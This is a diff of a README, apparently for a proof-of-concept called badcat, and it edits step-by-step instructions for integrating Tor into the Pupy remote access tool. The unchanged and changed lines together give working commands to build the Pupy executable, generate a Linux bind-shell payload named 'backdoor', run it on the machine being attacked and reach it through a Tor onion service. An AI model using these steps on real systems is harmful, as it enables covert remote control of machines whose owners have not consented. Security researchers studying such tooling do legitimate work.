@@ -105,10 +105,10 @@ $ file ./target/release/libbadcat_pupy.so
 
 This ELF shared library file is extremely important, it holds Tor and badcat code. Such file must be copied to two places:
 
-1. The directory where Pupy will be built. As you may already know, Pupy first build the executable (elf, exe, apk, etc) with a dummy string to be replaced with actual Python code later. This such build will our next step.
+1. The directory where Pupy will be built. As you may already know, Pupy first build the executable (elf, exe, apk, etc) with a dummy string to be replaced with actual Python code later. This such build will be our next step.
 2. Where you will run the resulting executable. As you may already know, the executable needs the shared library to run, remember this is a POC, ideally it should not need to carry the shared library to everywhere you need to run.
 
-Sooo, copy `libbadcat_pupy.so` shared library to `pupy/client/sources-linux`.
+Sooo, copy the `libbadcat_pupy.so` shared library to `pupy/client/sources-linux`.
 
 ### 5. Build Pupy Linux Executable
 
@@ -118,17 +118,15 @@ In order to generate the required executables, change your current working direc
 podman run --mount type=bind,src=$(pwd),target=/build/workspace/project pupy-local ./client/sources-linux/build-docker.sh
 ```
 
-It take some time to finish, but as soon as it has finished, one should see a `[+] Build complete` message.
+It take some time to finish, but as soon as it has finished, one should see a `[+] Build complete` message. If can check the directory `pupy/pupy/payload_templates` for generated executable templates. There is an issue with the generated linux template, that the template name misses a `x64` and one must fix it. To fix it, run the following command:
+
+```bash
+cp ./pupy/payload_templates/pupy.lin ./pupy/payload_templates/pupyx64.lin
+```
 
 ### 6. Build the Pupy Payload
 
-In order to generate the resulting executable with the payload, change your current working directory to the pupy source (`pupy/pupy`). Then you must fix the payload template name because it misses a `x64`. To fix it, just run:
-
-```bash
-cp ./payload_templates/pupy.lin ./payload_templates/pupyx64.lin
-```
-
-Now, enter Pupy shell:
+In order to generate the resulting executable with the payload, change your current working directory to the pupy source (`pupy/pupy`). Then enter inside the Pupy shell with the following command:
 
 ```bash
 python2 pupysh.py
@@ -144,11 +142,11 @@ Finally, build the payload:
 >> gen -O linux -A x64 -o backdoor bind --port 8000 -t badcat
 ```
 
-The resulting executable is at `./pupy/pupy/backdoor`. To fully test Pupy with badcat functionality, you need this `backdoor` executable, the integration shared library and Pupy shell of course.
+The resulting executable is at `./pupy/pupy/backdoor`. To fully test Pupy with badcat functionality, you need this `backdoor` executable, the integration shared library and the Pupy shell of course.
 
 ### 7. Start a Pupy Session with badcat
 
-First things first, prepare the machine you are attacking. This machine must have some weird libraries installed, with boring versions. So the best way I found was to use the container image, that created early under the name of `pupy-local`, derived from a Dockerfile I wrote myself.
+First things first, prepare the machine you are attacking. This machine must have some weird libraries installed, with boring versions. So the best way I found was to use the container image, the one created early under the name of `pupy-local`, derived from a Dockerfile I wrote myself.
 
 I started a container with an interactive shell and a mount for accessing the executable (`backdoor`) and the integration shared library (`libbadcat_pupy.so`) using the following command:
 
@@ -156,13 +154,13 @@ I started a container with an interactive shell and a mount for accessing the ex
 podman run --mount type=bind,src=$(pwd),target=/project -it pupy-local bash
 ```
 
-Inside the container access the directory with both files. Then run the executable providing the directory where the shared library is located, so it is find in runtime. In my case, the shared library was in the same directory, so a dot (`.`) is used there.
+Inside the container, access the directory with both files, in my case here is at the mountpoint `/project`. Then run the executable providing the directory where the shared library is located, so it is found in runtime. In my case, the shared library was in the same directory, so a dot (`.`) is used there.
 
 ```bash
 LD_LIBRARY_PATH=. ./backdoor
 ```
 
-Once the server is up and running, you need to connect through Tor using Pupy. In order to discover the generate Onion Service hostname, check on your current working directory the contents of the file at `hidden-service/hostname`. For instance, my server was:
+Once the server is up and running, you need to connect through Tor using Pupy. In order to discover the generated Onion Service hostname, check on your current working directory the contents of the file at `hidden-service/hostname`. For instance, my server is:
 
 ```bash
 $ cat ./hidden-service/hostname
